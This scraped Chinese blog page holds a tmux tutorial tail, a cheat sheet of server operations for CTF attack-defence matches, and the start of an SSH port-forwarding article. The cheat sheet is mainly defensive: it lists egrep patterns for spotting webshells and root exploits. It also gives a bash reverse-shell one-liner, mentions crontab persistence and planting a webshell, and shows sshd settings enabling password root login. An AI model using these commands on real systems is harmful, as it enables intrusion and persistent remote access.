<h3 id="窗口和窗格"><a href="#窗口和窗格" class="headerlink" title="窗口和窗格"></a>窗口和窗格</h3><p><img src="/images/2017-12-09/7178f37egw1esoxc7zgryj21670nf7li.jpg" alt="img"></p>
<p>这些高级功能之一就是 tmux 可以将一个会话分割成若干个称为窗口（Window）和窗格（Pane）的相互分离的组件。这种逻辑上的分割使用户可以轻松安排各种各样的操作。</p>
<p>下面就来看一看这几个概念之间的关系。</p>
<h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p><img src="/images/2017-12-09/7178f37egw1esoxc7hp5oj20gm0bkjs6.jpg" alt="img"></p>
<p>如上图所示，一个会话（Session）可以包含多个窗口，一个窗口（Window）可以包含多个窗格（Pane）。这就是我对这些概念的简单理解。当然如果诸位有更权威或者更实用的解释，我很乐意洗耳恭听。</p>
<ul>
<li>会话适用于分别管理大的工作内容，例如日常工作，实验或是系统管理，都可以分别在一个会话中进行。</li>
<li>窗口适用于分别管理这些大工作中的项目。例如，在用于实验的会话中可能有一叫做 noderestapi 的窗口用于调试 node REST API，有一个叫做 lua 的窗口用于调试 lua 脚本。</li>
<li>窗格适用于查看当前的项目。例如，在系统管理的会话中有一个叫做 logs 的窗口，在这个窗口中可以打开多个窗格分别用于查看 access log，error log和system log。</li>
</ul>
<p>我们也可以在会话中直接创建窗格，而不需要先创建一个窗口。我有时也会这样做。当阅读完“层次结构”这一小节，希望我的这种做法没有听起来那样恐怖。正如我在一开始谈到的，我更倾向于简化 tmux 的使用。</p>
<h4 id="在窗格间移动光标"><a href="#在窗格间移动光标" class="headerlink" title="在窗格间移动光标"></a>在窗格间移动光标</h4><p>虽然有默认的在窗格间移动光标的方法，但是我并不清楚是什么。因为我习惯用 vim，所以我会用<code>h</code>，<code>j</code>，<code>k</code> 和 <code>l</code> 键在窗格间移动光标。为此，要加入如下的配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Remap window(pane?) navigation to vim</div><div class="line"># 用 vim 的方式在窗格间移动光标</div><div class="line">unbind-key j</div><div class="line">bind-key j select-pane -D</div><div class="line">unbind-key k</div><div class="line">bind-key k select-pane -U</div><div class="line">unbind-key h</div><div class="line">bind-key h select-pane -L</div><div class="line">unbind-key l</div><div class="line">bind-key l select-pane -R</div></pre></td></tr></table></figure>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a><strong>建议</strong></h2><p>以下几条建议也许会有助于诸位的 tmux 之旅：</p>
<ol>
<li>尽可能少打开会话和窗口。人类没有我们自认为的那样善于处理多任务。虽然打开 47 个窗格显得很强大，但是这并没有我们想象的那样实用。</li>
<li>当确实要使用窗口和窗格时，花一点时间为它们起个有意义的名字。这非常有用，如果只是用 0、1、2 这样的名字，切换会话或窗口时就会非常麻烦。</li>
<li>从基础的配置、操作开始使用 tmux，别一上来就把自己搞糊涂了。我曾遇到过很多人，他们花费了大量的时间配置 vim 或 tmux，而最终带来的结果却是不但把自己绕进去了，而且项目也没有进展。<h2 id="快捷键参考"><a href="#快捷键参考" class="headerlink" title="快捷键参考"></a>快捷键参考</h2></li>
</ol>
<p>按下 <code>Ctrl-b</code> 后的快捷键如下：</p>
<h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><ul>
<li><code>?</code> 获取帮助信息</li>
</ul>
<h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><ul>
<li><code>s</code> 列出所有会话</li>
<li><code>$</code> 重命名当前的会话</li>
<li><code>d</code> 断开当前的会话</li>
</ul>
<h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><ul>
<li><code>c</code> 创建一个新窗口</li>
<li><code>,</code> 重命名当前窗口</li>
<li><code>w</code> 列出所有窗口</li>
<li><code>%</code> 水平分割窗口</li>
<li><code>&quot;</code> 竖直分割窗口</li>
<li><code>n</code> 选择下一个窗口</li>
<li><code>p</code> 选择上一个窗口</li>
<li><code>0~9</code> 选择0~9对应的窗口</li>
</ul>
<h3 id="窗格管理"><a href="#窗格管理" class="headerlink" title="窗格管理"></a>窗格管理</h3><ul>
<li><code>%</code> 创建一个水平窗格</li>
<li><code>&quot;</code> 创建一个竖直窗格</li>
<li><code>h</code> 将光标移入左侧的窗格*</li>
<li><code>j</code> 将光标移入下方的窗格*</li>
<li><code>l</code> 将光标移入右侧的窗格*</li>
<li><code>k</code> 将光标移入上方的窗格*</li>
<li><code>q</code> 显示窗格的编号</li>
<li><code>o</code> 在窗格间切换</li>
<li><code>}</code> 与下一个窗格交换位置</li>
<li><code>{</code> 与上一个窗格交换位置</li>
<li><code>!</code> 在新窗口中显示当前窗格</li>
<li><code>x</code> 关闭当前窗格&gt; 要使用带“*”的快捷键需要提前配置，配置方法可以参考上文的“在窗格间移动光标”一节。——译者注</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><ul>
<li><code>t</code> 在当前窗格显示时间</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/ctf运维的基本操作/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/09/ctf运维的基本操作/" itemprop="url">ctf运维的基本操作</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T14:53:50+08:00">
                2017-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/运维/" itemprop="url" rel="index">
                    <span itemprop="name">运维</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1、ssh相关操作"><a href="#1、ssh相关操作" class="headerlink" title="1、ssh相关操作"></a>1、ssh相关操作</h3><p>启动ssh（root亦可登录）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">service sshd start</div><div class="line">vi /etc/ssh/sshd_config</div><div class="line">- 取消PasswordAuthentication yes的注释</div><div class="line">- 将#PermitRootLogin prohibit-password后加入一行PermitRootLogin yes</div><div class="line">service sshd restart</div></pre></td></tr></table></figure>
<p>ssh登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell登录</div><div class="line">- ssh [user@]host[ port][;host[ port]]</div><div class="line">- ssh root@172.168.12.13 22   //进入界面中设置用户名、密码</div><div class="line">- ssh 172.168.12.13  ;172.168.12.13 22  //console中设置用户名和密码</div><div class="line"></div><div class="line">linux中ssh登录</div><div class="line">- ssh root@172.168.12.13 -p 22</div></pre></td></tr></table></figure>
<p>ssh文件传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell下载（最好是配合Xftp）</div><div class="line"></div><div class="line">命令下载（scp）</div><div class="line">- scp local_file remote_username@remote_ip:remote_folder </div><div class="line">- scp remote_username@remote_ip:remote_file local_file </div><div class="line">- scp -r local_folder remote_username@remote_ip:remote_folder </div><div class="line">- scp -r remote_username@remote_ip:remote_folder local_folder</div></pre></td></tr></table></figure>
<h3 id="2、vim常用修改"><a href="#2、vim常用修改" class="headerlink" title="2、vim常用修改"></a>2、vim常用修改</h3><h4 id="2-1-影响范围"><a href="#2-1-影响范围" class="headerlink" title="2.1 影响范围"></a>2.1 影响范围</h4><p>当前文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:命令</div></pre></td></tr></table></figure>
<p>当前用户的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vim ~/.vimrc</div><div class="line">命令</div></pre></td></tr></table></figure>
<p>所有用户的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /etc/vim/vimrc</div><div class="line"></div><div class="line">命令</div></pre></td></tr></table></figure>
<h4 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h4><p>显示行号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nu或者:set number</div></pre></td></tr></table></figure>
<p>不显示行号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nonu 或者:set nonumber</div></pre></td></tr></table></figure>
<p>设置tab长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set tabstop=4</div></pre></td></tr></table></figure>
<p>设置文件格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:set fileformat=unix或者:set ff=unix</div><div class="line">:set fileformat=dos或者:set ff=dos</div></pre></td></tr></table></figure>
<h3 id="3、find指令"><a href="#3、find指令" class="headerlink" title="3、find指令"></a>3、find指令</h3><p>查找文件类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -name *.php</div></pre></td></tr></table></figure>
<p>查找某种权限的文件及文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-perm(permission)</div><div class="line">- -perm mode：精确匹配权限</div><div class="line">- -perm -mode：完全包含此mode时才可以匹配</div><div class="line">- -perm +mode：任何一位匹配即可</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a权限转为2进制后为 000 110 000 000 (0600)</div><div class="line">b权限转为2进制后为 000 010 000 000 (0200)</div><div class="line">c权限转为2进制后为 000 100 000 000 (0400)</div><div class="line">d权限转为2进制后为 000 110 110 000 (0660)</div><div class="line"></div><div class="line">1. 在find . -type f -perm -0600 中的0600权限转为2进制为000 110 000 000,那么0600前的-号代表缺一不可,也就是如果有1的地方必须有1,那么这里找-0600权限的文件,这0600权限里前面有2个位置都是1,所以这里find找-0600权限的文件就是找第4、5位都是1的文件.而只有a d这两个文件前2个位置都是1,所以find . -type f -perm -0600 只会找到a d两个文件.</div><div class="line">2. find . -type f -perm +0600会找到a b c d这4个文件,这是因为: </div><div class="line">   +0600 里的这个+号代表有1即可,也就是有1的位置，任何位置只要有1就可以.那么这里找+0600权限的文件,这0600权限第4、5位都有1,所以这里find 找+0600权限的文件就是找第4、5位只要有一个位置有1的文件就可以了,这4个文件都符合要求所以最后都能被 find . -type f -perm +0600找到</div></pre></td></tr></table></figure>
<p>多种条件并列查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">find / -type f  -perm -04000 -o -perm -02000		// 或关系</div><div class="line"></div><div class="line">find / -type f  -perm -04000 -a -perm -02000		// 与关系</div></pre></td></tr></table></figure>
<p>查找符合某些特征的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 找php木马</div><div class="line">find / -type f -name *.php | xargs egrep -l &quot;mysql_query\($query, $dbconn\)|专用网马|udf.dll|class PHPzip\&#123;|ZIP压缩程序 荒野无灯修改版|$writabledb|AnonymousUserName|eval\(|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|if\(empty\($_SESSION|$shellname|$work_dir |PHP木马|Array\(&quot;$filename&quot;| eval\($_POST\[|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门&quot;</div><div class="line"></div><div class="line"># 找jsp木马</div><div class="line">find / -type f -name *.jsp | xargs egrep -l &quot;InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门&quot;</div><div class="line"></div><div class="line"># 找HTML恶意代码</div><div class="line">find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330&quot;</div><div class="line"></div><div class="line"># 找perl恶意程序</div><div class="line">find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;</div><div class="line"></div><div class="line"># 找python恶意程序</div><div class="line">find / -type f -name *.py | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb&quot;</div><div class="line"></div><div class="line"># 检查系统是否存在恶意程序</div><div class="line">find / -type f -perm -111  |xargs egrep &quot;UpdateProcessER12CUpdateGatesE6C|CmdMsg\.cpp|MiniHttpHelper.cpp|y4&apos;r3 1uCky k1d\!|execve@@GLIBC_2.0|initfini.c|ptmalloc_unlock_all2|_IO_wide_data_2|system@@GLIBC_2.0|socket@@GLIBC_2.0|gettimeofday@@GLIBC_2.0|execl@@GLIBC_2.2.5|WwW.SoQoR.NeT|2.6.17-2.6.24.1.c|Local Root Exploit|close@@GLIBC_2.0|syscall\(\__NR\_vmsplice,|Linux vmsplice Local Root Exploit|It looks like the exploit failed|getting root shell&quot; 2&gt;/dev/null</div></pre></td></tr></table></figure>
<h3 id="4、tar指令"><a href="#4、tar指令" class="headerlink" title="4、tar指令"></a>4、tar指令</h3><p>打包文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zcvf /tmp/www.tgz /var/www/html</div></pre></td></tr></table></figure>
<p>解压文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zxvf /tmp/www.tgz -C /tmp/</div></pre></td></tr></table></figure>
<p>不同类型的压缩文件相关参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、*.tar 用 tar –xvf 解压</div><div class="line">2、*.gz 用 gzip -d或者gunzip 解压</div><div class="line">3、.tar.gz和.tgz 用 tar –xzf 解压</div><div class="line">4、*.bz2 用 bzip2 -d或者用bunzip2 解压</div><div class="line">5、*.tar.bz2用tar –xjf 解压</div><div class="line">6、*.Z 用 uncompress 解压</div><div class="line">7、*.tar.Z 用tar –xZf 解压</div><div class="line">8、*.rar 用 unrar e解压</div><div class="line">9、*.zip 用 unzip 解压</div></pre></td></tr></table></figure>
<h3 id="5、备份"><a href="#5、备份" class="headerlink" title="5、备份"></a>5、备份</h3><p>网站备份</p>
<blockquote>
<p>利用上述tar命令将文件进行打包备份</p>
</blockquote>
<p>sql备份</p>
<blockquote>
<p>sql备份需要相关工作者，分析网站系统，并得到sql服务器密码，通过相应指令进行备份。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">备份数据库</div><div class="line">- mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql</div><div class="line">- mysqldump --all-databases &gt; bak.sql</div><div class="line"></div><div class="line">还原数据库</div><div class="line">- mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</div></pre></td></tr></table></figure>
<h3 id="6、杀死进程"><a href="#6、杀死进程" class="headerlink" title="6、杀死进程"></a>6、杀死进程</h3><p>web服务进程分两种，一种是运维者的进程，一种为攻击者的进程。攻击者的进程一般是恶意进程，而且运维者并没有权限杀死改进程。为了杀死这些www-data用户的进程，我们应该在服务器上挂个马，然后通过网络访问的方式删除木马、杀死僵尸进程等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">用户用ssh偷偷连接web服务器</div><div class="line">- w</div><div class="line">- pkill -kill -t &lt;用户tty&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">查看所有的进程</div><div class="line">- ps aux</div><div class="line">- ps -ef</div><div class="line"></div><div class="line">查看某个用户的进程</div><div class="line">- ps -f -u www-data</div><div class="line"></div><div class="line">查看已建立的网络连接及进程</div><div class="line">- netstat -antulp | grep EST</div><div class="line"></div><div class="line">查看指定端口被那个进程占用</div><div class="line">- lsof -i:端口号</div><div class="line">- netstat -tunlp|grep 端口号</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">结束进程</div><div class="line">- kill PID		  // 只能是PID</div><div class="line">- killall &lt;进程名&gt;  // 只能是进程名</div><div class="line">- kill -9 PID          // 此处的9是signal，代表SIGKILL</div><div class="line">- killall -u www-data   //杀死www-data的所有进程</div><div class="line"></div><div class="line">找反弹的shell进程</div><div class="line">ps aux|grep &quot;bash -i&quot;</div></pre></td></tr></table></figure>
<h3 id="7、iptables设置"><a href="#7、iptables设置" class="headerlink" title="7、iptables设置"></a>7、iptables设置</h3><p>其实主办方一般不会给iptables的相关权限，毕竟给了这个权限之后就没法玩了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#Allow youself Ping other hosts , prohibit others Ping you</div><div class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</div><div class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</div><div class="line"></div><div class="line">#Close all INPUT FORWARD OUTPUT, just open some ports</div><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -P FORWARD DROP</div><div class="line">iptables -P OUTPUT DROP</div><div class="line"></div><div class="line">#Open ssh</div><div class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</div><div class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</div><div class="line"></div><div class="line">#ip prohibit</div><div class="line">iptables -A INPUT -p tcp --dport 80 -s 172.16.0.86 -j DROP</div></pre></td></tr></table></figure>
<h3 id="8、crontab设置"><a href="#8、crontab设置" class="headerlink" title="8、crontab设置"></a>8、crontab设置</h3><p>作为维护者，为了方便自己定时检查数据内容，我们可以写个程序，利用crontab定时检查！</p>
<p>作为攻击者，为了让维护者无法完全杀死自己，其可以起一个crontab定时程序，让服务器定时反弹shell或者执行木马程序。</p>
<p>关于crontab的使用，可以参见以前的博文 <a href="/2017/11/26/crontab指令介绍/">crontab指令介绍</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">显示某个用户的crontab文件内容</div><div class="line">crontab -l -u user</div><div class="line"></div><div class="line">删除crontab内容</div><div class="line">crontab -r -u user</div></pre></td></tr></table></figure>
<h3 id="9、挂waf的相关操作"><a href="#9、挂waf的相关操作" class="headerlink" title="9、挂waf的相关操作"></a>9、挂waf的相关操作</h3><p>一般情况下，系统不会立马被人攻陷，所以运维者至少有10分钟的时间可以维护主机。那么这段时间应该做些什么？</p>
<blockquote>
<p>首先将网站备份，并上传waf、file_check等必要工具；</p>
<p>然后挂上waf。将waf放置到/tmp目录下，并给waf、waf/log/、waf/log_all/ 以及相应的文件777权限，然后配置好setup.py、waf.php，最后执行python setup.py；</p>
<p>其次就是启动file_check程序。将file_check放置到/tmp目录下，配置file_check.py，执行python file_check.p；;</p>
<p>最后将sql备份(不一定是必须的，因为sql不一定有。之所以将其放置到最后，是因为从代码中l找到sql密码较为耗时间！)，并将网站备份、sql备份下载至本地。</p>
</blockquote>
<h3 id="10、扫描网络"><a href="#10、扫描网络" class="headerlink" title="10、扫描网络"></a>10、扫描网络</h3><p>扫描网络在闲暇比赛中其实很重要。首先，你需要将目标网段确定，一般就是一个/24的网段，可能存在的服务器不会超过256台。但是，仅仅这个数量其实也挺多的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">#扫描指定端口</div><div class="line">nmap -n --open -p 80 X.X.X.X/24</div><div class="line"></div><div class="line">#扫描指定网段的远程桌面连接端口</div><div class="line">nmap -sT -p3389 218.206.112.0/24</div><div class="line"></div><div class="line">#使用nmap来扫描端口UDP</div><div class="line">nmap -sU 202.96.128.86 -p 53 -Pn</div><div class="line"></div><div class="line">#进行安全检测(全端口扫描)</div><div class="line">nmap -v -A 219.129.216.156</div><div class="line"></div><div class="line">#仅列出指定网络上的每台主机，不发送任何报文到目标主机（能够得到相应的域名）</div><div class="line">nmap -sL 192.168.1.0/24</div><div class="line"></div><div class="line">#探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)</div><div class="line">nmap -PS 192.168.1.234 </div><div class="line"></div><div class="line">#使用UDP ping探测主机</div><div class="line">nmap -PU 192.168.1.0/24</div><div class="line"></div><div class="line">#使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快</div><div class="line">nmap -sS 192.168.1.0/24 </div><div class="line"></div><div class="line">#当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描</div><div class="line">nmap -sT 192.168.1.0/24 </div><div class="line"></div><div class="line">#UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口</div><div class="line">nmap -sU 192.168.1.0/24 </div><div class="line"></div><div class="line">#确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等)</div><div class="line">nmap -sO 192.168.1.19</div><div class="line"></div><div class="line">#探测目标主机的操作系统</div><div class="line">nmap -O 192.168.1.19 </div><div class="line">nmap -A 192.168.1.19 </div><div class="line"></div><div class="line">#进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)</div><div class="line">nmap -sP 192.168.1.0/24</div></pre></td></tr></table></figure>
<p>上述是基本操作，配合grep、awk可以得到更为玄妙的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#扫描指定网段的指定端口，并输出至ip.data</div><div class="line">nmap -n --open -p 80 10.254.20.0/24 | grep -B3 &quot;80/tcp&quot;|grep &quot;report for&quot;|awk &apos;&#123;print $5&#125;&apos; &gt;&gt; ip.data</div></pre></td></tr></table></figure>
<p>类似地，我们可以通过nmap的扫描结果，提取出需要的内容。</p>
<h3 id="11、常用技巧"><a href="#11、常用技巧" class="headerlink" title="11、常用技巧"></a>11、常用技巧</h3><p>反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
<p>运行crontab</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">crontab cronfile</div></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/07/ssh端口转发/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/07/ssh端口转发/" itemprop="url">ssh端口转发</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-07T00:49:29+08:00">
                2017-12-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="第一部分-概述"><a href="#第一部分-概述" class="headerlink" title="第一部分 概述"></a>第一部分 概述</h2><p>当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！</p>
<h3 id="端口转发概述"><a href="#端口转发概述" class="headerlink" title="端口转发概述"></a>端口转发概述</h3><p>让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能：</p>
<ol>
<li>加密 SSH Client 端至 SSH Server 端之间的通讯数据。</li>
<li>突破防火墙的限制完成一些之前无法建立的 TCP 连接。</li>
</ol>
